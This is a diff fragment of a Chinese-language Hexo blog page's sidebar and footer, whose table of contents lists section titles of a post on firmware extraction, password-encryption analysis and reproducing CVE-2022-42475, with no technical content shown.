+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="nav-number">1.</span> <span class="nav-text">固件提取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">设备调试环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%88%86%E6%9E%90%E6%89%BE%E5%88%B0%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%9A%84%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%EF%BC%88%E7%AE%A1%E7%90%86%E5%91%98%E3%80%81%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">通过分析找到用户密码的加密方式（管理员、普通用户）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Maintainer"><span class="nav-number">3.1.</span> <span class="nav-text">Maintainer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7"><span class="nav-number">3.2.</span> <span class="nav-text">管理员账户</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">CVE复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2022-42475"><span class="nav-number">4.1.</span> <span class="nav-text">CVE-2022-42475</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Munan"
+      src="/images/web-app-manifest-512x512.png">
+  <p class="site-author-name" itemprop="name">Munan</p>
+  <div class="site-description" itemprop="description">网络安全爱好者</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Munan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
